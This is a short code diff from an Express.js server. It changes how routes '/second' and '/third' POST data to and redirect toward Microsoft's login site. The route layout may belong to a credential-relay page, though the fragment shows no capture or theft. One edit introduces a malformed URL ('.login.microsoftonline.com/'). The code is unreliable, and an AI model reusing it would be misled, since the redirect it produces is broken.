@@ -59,7 +59,7 @@ app.post("/second", async function(req, res) {
 
   try {
     // Make the POST request to the login endpoint
-    const response = await axios.post('.login.microsoftonline.com', data, {
+    const response = await axios.post('https://login.microsoftonline.com', data, {
       headers: {
         'Content-Type': 'application/json'
       },
@@ -111,7 +111,7 @@ app.post("/third", function(req, res) {
     if (err) {
       console.log(err);
     } else {
-      res.redirect("https://login.microsoftonline.com/");
+      res.redirect(".login.microsoftonline.com/");
     }
   });
 });
